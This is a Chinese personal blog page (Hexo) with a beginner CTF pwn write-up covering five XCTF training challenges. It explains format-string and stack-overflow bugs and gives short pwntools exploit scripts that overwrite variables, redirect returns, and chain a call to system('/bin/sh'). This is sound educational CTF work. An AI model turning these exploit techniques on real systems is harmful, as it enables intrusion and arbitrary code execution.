@@ -1,0 +1,862 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/iconz-64.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/iconz-32.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/iconz-16.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="ctf,pwn,Linux,学习," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="CTF_pwn相关攻防世界新手入门——上篇在本篇中只讲了前5题新手题。题目来源为 攻防世界 。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CTF_pwn相关">
+<meta property="og:url" content="https://changyoo.xyz/2019/11/15/CTF-learning-001/index.html">
+<meta property="og:site_name" content="Zcy&#39;s Blog">
+<meta property="og:description" content="CTF_pwn相关攻防世界新手入门——上篇在本篇中只讲了前5题新手题。题目来源为 攻防世界 。">
+<meta property="og:image" content="https://changyoo.xyz/2019/11/15/CTF-learning-001/0x01.png">
+<meta property="og:image" content="https://changyoo.xyz/2019/11/15/CTF-learning-001/0x02.png">
+<meta property="og:image" content="https://changyoo.xyz/2019/11/15/CTF-learning-001/0x03.png">
+<meta property="og:image" content="https://changyoo.xyz/2019/11/15/CTF-learning-001/0x03-pwnme-addr.png">
+<meta property="og:image" content="https://changyoo.xyz/2019/11/15/CTF-learning-001/0x02-codes.png">
+<meta property="og:image" content="https://changyoo.xyz/2019/11/15/CTF-learning-001/0x02-bss.png">
+<meta property="og:image" content="https://changyoo.xyz/2019/11/15/CTF-learning-001/0x03-01.png">
+<meta property="og:image" content="https://changyoo.xyz/2019/11/15/CTF-learning-001/0x03-02.png">
+<meta property="og:image" content="https://changyoo.xyz/2019/11/15/CTF-learning-001/0x03-sec.png">
+<meta property="og:image" content="https://changyoo.xyz/2019/11/15/CTF-learning-001/0x03-callsys.png">
+<meta property="og:image" content="https://changyoo.xyz/2019/11/15/CTF-learning-001/0x03-buf-size.png">
+<meta property="og:image" content="https://changyoo.xyz/2019/11/15/CTF-learning-001/0x04-ida.png">
+<meta property="og:image" content="https://changyoo.xyz/2019/11/15/CTF-learning-001/0x04-checksec.png">
+<meta property="og:image" content="https://changyoo.xyz/2019/11/15/CTF-learning-001/0x04-ropgadget.png">
+<meta property="og:image" content="https://changyoo.xyz/2019/11/15/CTF-learning-001/0x04-system.png">
+<meta property="og:image" content="https://changyoo.xyz/2019/11/15/CTF-learning-001/0x05-ida.png">
+<meta property="og:image" content="https://changyoo.xyz/2019/11/15/CTF-learning-001/0x05-stack.png">
+<meta property="article:published_time" content="2019-11-14T16:00:00.000Z">
+<meta property="article:modified_time" content="2020-05-25T08:38:09.290Z">
+<meta property="article:author" content="zcy">
+<meta property="article:tag" content="ctf">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="Linux">
+<meta property="article:tag" content="学习">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://changyoo.xyz/2019/11/15/CTF-learning-001/0x01.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://changyoo.xyz/2019/11/15/CTF-learning-001/"/>
+
+
+
+
+
+  <title>CTF_pwn相关 | Zcy's Blog</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Zcy's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://changyoo.xyz/2019/11/15/CTF-learning-001/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="zcy">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Zcy's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">CTF_pwn相关</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-11-15T00:00:00+08:00">
+                2019-11-15
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2019/11/15/CTF-learning-001/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count"
+                        data-disqus-identifier="2019/11/15/CTF-learning-001/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv">阅读量：
+            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>人次
+            </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="CTF-pwn相关"><a href="#CTF-pwn相关" class="headerlink" title="CTF_pwn相关"></a>CTF_pwn相关</h1><h2 id="攻防世界新手入门——上篇"><a href="#攻防世界新手入门——上篇" class="headerlink" title="攻防世界新手入门——上篇"></a>攻防世界新手入门——上篇</h2><p>在本篇中只讲了前5题新手题。题目来源为 <a href="https://adworld.xctf.org.cn/" target="_blank" rel="noopener">攻防世界</a> 。</p>
+<a id="more"></a>
+
+<h3 id="0x01-CGfsb"><a href="#0x01-CGfsb" class="headerlink" title="0x01 CGfsb"></a>0x01 CGfsb</h3><p>这是攻防世界新手区的第二题，答对人数仅次于第一的签到题。先放题目。</p>
+<p><img src="./0x01.png" alt="核心代码"></p>
+<p>结合代码和题目的提示，大致思路应该是用printf的漏洞将pwnme改成8。</p>
+<p>众所周知printf是一个用来输出的函数，在c语言的 hello world 中就有用到printf函数。但是如果在程序当中的用法不正规的话就会由此产生安全漏洞，在上面的题目伪代码当中， 就可以通过非法的输入利用printf函数来读写任意地址的内存数据。</p>
+<p>关于漏洞的原理。由于C语言允许函数的参数不固定，也就是同一个函数的参数数量可以不一样，但是在printf函数实际输出时仍然需要有确定的函数参数个数，所以就需要借助格式化字符来实现对参数的确定。而不安全的代码书写方式如下例段中，printf的首个参数完全由用户去控制，就会产生相应的格式化字符漏洞。通过使用诸如 <code>%s %c %x</code> 等格式化字符可以实现读取内存中的数据，而使用 <code>%n</code> 则可以实现对内存的写操作。再结合使用 <code>$</code> 符号可以就可以实现任意地址读写。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> str;</span><br><span class="line"><span class="built_in">memset</span>(str,<span class="string">'\0'</span>,<span class="number">12</span>);</span><br><span class="line">fgets(&amp;str, <span class="number">12</span>, <span class="built_in">stdin</span>);</span><br><span class="line"><span class="built_in">printf</span>(str);     <span class="comment">//安全的写法应该是printf("%s",str);</span></span><br></pre></td></tr></table></figure>
+
+<p>上面的代码在正常输入的时候是可以正常运行并实现我们想要的功能的，但是如果输入中包含格式化字符如 <code>%x %s %c %d %n</code> 时就会触发漏洞。如果在函数中的格式化字符数量多于代码中给定的参数，printf就会忠实地按照格式化字符指定的类型将栈上的数据打印出来，也就可以实现通过printf泄漏内存数据。</p>
+<p>在本题中亦是如此，直接输入 <code>%x</code> （以16进制形式输出）：</p>
+<p><img src="./0x02.png" alt="带有格式化字符的输入"></p>
+<p>输出结果为： <code>ffffce6e.f7f96540.1.0.1</code> ，再看一下栈上保存的数据：</p>
+<p><img src="./0x03.png" alt="img"></p>
+<p>可见通过 <code>%x</code> 将栈上的数据逐一以16进制输出了，再通过如 <code>%3$x</code> 的方式可以指定输出第三个数据（即 <code>0x1</code> ）。而使用 <code>%3$n</code> 就可以实现在第三个参数对应的位置的数据写入操作了。鉴于%n并不常用，在此附上一个维基百科的解释。</p>
+<blockquote>
+<p>  %n | 不输出字符，但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量。</p>
+</blockquote>
+<p>也就是说在 <code>%n</code> 前输出过多少的字符，就会将这个输出的字符数量以int值写入 <code>%n</code> 所在参数位置对应的地址中。利用这点就可以用来实现改写本题pwnme变量的值。那么本题的思路就是通过将pwnme的地址写到printf的参数位中，再用 <code>%n</code> 将其改为8。</p>
+<p>解题过程。首先用ida找到pwnme在内存的位置。</p>
+<p><img src="./0x03-pwnme-addr.png" alt="pwnme的内存地址"></p>
+<p>然后将地址写入到栈上保存字符串的地方。因为转码后只有4个字符，所以还需要4个字符占位才能让%n写入8。</p>
+<p>exp如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process('./cgfsb')</span></span><br><span class="line">p = remote(<span class="string">'111.198.29.45'</span>,<span class="number">54359</span>)</span><br><span class="line">payload = p32(<span class="number">0x0804a068</span>) + <span class="string">'abcd'</span> + <span class="string">'%10$n'</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'name:\n'</span>)</span><br><span class="line">p.sendline(<span class="string">'zccy'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'please:\n'</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>碎碎念：这是一题很简单的利用格式化字符漏洞的题目，但是却坑了我足足3天的时间，因为在我现在用的manjaro上pwntools有很多函数都用不了，其中有一个就是p32。而且即便是p32之后输出的内容直接输入gdb调试也并不能成功，直到最后装了ubuntu虚拟机才搞定。</p>
+<h3 id="0x02-hello-pwn"><a href="#0x02-hello-pwn" class="headerlink" title="0x02 hello_pwn"></a>0x02 hello_pwn</h3><p>先IDA看看代码。</p>
+<p><img src="./0x02-codes.png" alt="hello_pwn_src"></p>
+<p>代码逻辑很简单，只要溢出并把pwn的值改称1853186401就可以了，read足足有16个字节，而看一下栈内分布发现实际只有4个字节就到pwn的位置了。</p>
+<p><img src="./0x02-bss.png" alt="0x02_bss"></p>
+<p>直接写exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'111.198.29.45'</span>, <span class="number">45295</span>)</span><br><span class="line">p.recvuntil(<span class="string">'bof\n'</span>)</span><br><span class="line">payload = <span class="string">'a'</span> * <span class="number">4</span> + p64(<span class="number">1853186401</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x03-level0"><a href="#0x03-level0" class="headerlink" title="0x03 level0"></a>0x03 level0</h3><p>上IDA。</p>
+<p><img src="./0x03-01.png" alt="part1"></p>
+<p><img src="./0x03-02.png" alt="part2"></p>
+<p>推测通过read函数溢出并直接getshell，再看一下保护。</p>
+<p><img src="./0x03-sec.png" alt="checksec"></p>
+<p>只有NX，所以思路可行，再在IDA里找找可用的函数，直接找到一个call_system()，函数地址是在0x400596。</p>
+<p><img src="./0x03-callsys.png" alt="callsystem"></p>
+<p>所以这题的思路是在read溢出，把返回地址改成0x400596，即可。</p>
+<p>看栈分布可知buf长度为128，再写8位就可以覆盖返回地址，所以一共要136位长度来溢出。</p>
+<p><img src="./0x03-buf-size.png" alt="buf-size"></p>
+<p>exp如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote()</span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">136</span> + p64(<span class="number">0x400596</span>)</span><br><span class="line">p.recvuntil(<span class="string">'ld\n'</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x04-level2"><a href="#0x04-level2" class="headerlink" title="0x04 level2"></a>0x04 level2</h3><p>伪代码如下：</p>
+<p><img src="./0x04-ida.png" alt="ida"></p>
+<p>主函数只是调用了这个函数就返回了。而这个函数虽然有system但是参数并不是 <code>&#39;/bin/sh&#39;</code> ，结合题目提示，应该使用ROP，再看一眼保护状态，确定是用ROP。</p>
+<p><img src="./0x04-checksec.png" alt="checksec"></p>
+<p>ROP就不详细介绍了，首先找找要用到的零件，分别需要system函数的地址和函数参数 <code>&#39;/bin/sh&#39;</code> 字符的地址。求助pwntools的ROPgadget，找到了参数的地址，再看gdb的 <code>disassemble system</code> 给的函数地址，两个接一起就完事了。至于溢出的地址依旧是看IDA里的栈分布再计算就行，需要注意的是函数参数与函数地址是有一字节的间隔的。</p>
+<p><img src="./0x04-ropgadget.png" alt="ROPgadget"></p>
+<p><img src="./0x04-system.png" alt="gdb_disassemble"></p>
+<p>exp如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p &#x3D; remote(&#39;&#39;,)</span><br><span class="line">sys_adr &#x3D; 0x8048320</span><br><span class="line">sh_adr &#x3D; 0x804a024</span><br><span class="line">payload &#x3D; &#39;a&#39; * 140 + p32(sys_adr) + p32(0) + p32(sh_adr)</span><br><span class="line">p.recvuntil(&#39;:&#39;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>碎碎念：做这题的时候被IDA的函数地址表摆了一道，因为这题IDA里给的system函数的地址是 <code>0x804a038</code> ，跟gdb给的地址不是同一个，所以一直失败，直到在逐步调试的时候才看到gdb里面给的system函数的地址。不过就算如此IDA还是神器！！</p>
+<h3 id="0x05-when-did-you-born"><a href="#0x05-when-did-you-born" class="headerlink" title="0x05 when_did_you_born"></a>0x05 when_did_you_born</h3><p>直接IDA伺候：</p>
+<p><img src="./0x05-ida.png" alt="ida_code"></p>
+<p>简单看一下可以发现这题主要是要在输入age后在输入name的时候改变age的值，在第一次输入的时候不能是1926，然后进入else段再利用gets函数溢出把age改成1926就行了。所以再来看一下栈分布。</p>
+<p><img src="./0x05-stack.png" alt="img"></p>
+<p>可以看到在栈内name和age只相隔8个字节，所以直接写exp。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">''</span>,)</span><br><span class="line">payload = <span class="string">'a'</span> * <span class="number">8</span> + p64(<span class="number">1926</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'?'</span>, <span class="string">'1111'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'?'</span>, payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>（这题还是挺暴力的：P</p>
+<h2 id=""><a href="#" class="headerlink" title=""></a></h2><p>至此前五题已经搞定了，总的来说都是很简单的，只是考察了一些基本的概念和一些工具的使用，后面的题暂时还没想到思路所以就先鸽着，等搞定了再把剩下几题的writeup写了。去吃饭了拜拜</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+      <div>
+        <ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者：</strong>
+    zcy
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://changyoo.xyz/2019/11/15/CTF-learning-001/" title="CTF_pwn相关">https://changyoo.xyz/2019/11/15/CTF-learning-001/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>
+    本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+
+      </div>
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/ctf/" rel="tag"># ctf</a>
+          
+            <a href="/tags/pwn/" rel="tag"># pwn</a>
+          
+            <a href="/tags/Linux/" rel="tag"># Linux</a>
+          
+            <a href="/tags/%E5%AD%A6%E4%B9%A0/" rel="tag"># 学习</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/10/30/manjaro-daily/" rel="next" title="不折腾不舒服之Manjaro">
+                <i class="fa fa-chevron-left"></i> 不折腾不舒服之Manjaro
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2020/03/17/restart-page/" rel="prev" title="重新开张！">
+                重新开张！ <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+    <div class="comments" id="comments">
+      <div id="disqus_thread">
+        <noscript>
+          Please enable JavaScript to view the
+          <a href="https://disqus.com/?ref_noscript" target="_blank" rel="noopener">comments powered by Disqus.</a>
+        </noscript>
+      </div>
+    </div>
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">zcy</p>
+              <p class="site-description motion-element" itemprop="description">一个啥都有的个人博客</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/%7C%7C%20archive">
+              
+                  <span class="site-state-item-count">7</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                
+                  <span class="site-state-item-count">10</span>
+                  <span class="site-state-item-name">标签</span>
+                
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/SSoyca" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="wgYazp8wt@outlook.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#CTF-pwn相关"><span class="nav-number">1.</span> <span class="nav-text">CTF_pwn相关</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#攻防世界新手入门——上篇"><span class="nav-number">1.1.</span> <span class="nav-text">攻防世界新手入门——上篇</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-CGfsb"><span class="nav-number">1.1.1.</span> <span class="nav-text">0x01 CGfsb</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-hello-pwn"><span class="nav-number">1.1.2.</span> <span class="nav-text">0x02 hello_pwn</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x03-level0"><span class="nav-number">1.1.3.</span> <span class="nav-text">0x03 level0</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x04-level2"><span class="nav-number">1.1.4.</span> <span class="nav-text">0x04 level2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x05-when-did-you-born"><span class="nav-number">1.1.5.</span> <span class="nav-text">0x05 when_did_you_born</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#"><span class="nav-number">1.2.</span> <span class="nav-text"></span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2019 &mdash; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">zcy</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a></div>
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+    
+      <script id="dsq-count-scr" src="https://zcysblogs.disqus.com/count.js" async></script>
+    
+
+    
+      <script type="text/javascript">
+        var disqus_config = function () {
+          this.page.url = 'https://changyoo.xyz/2019/11/15/CTF-learning-001/';
+          this.page.identifier = '2019/11/15/CTF-learning-001/';
+          this.page.title = 'CTF_pwn相关';
+        };
+        var d = document, s = d.createElement('script');
+        s.src = 'https://zcysblogs.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', '' + +new Date());
+        (d.head || d.body).appendChild(s);
+      </script>
+    
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
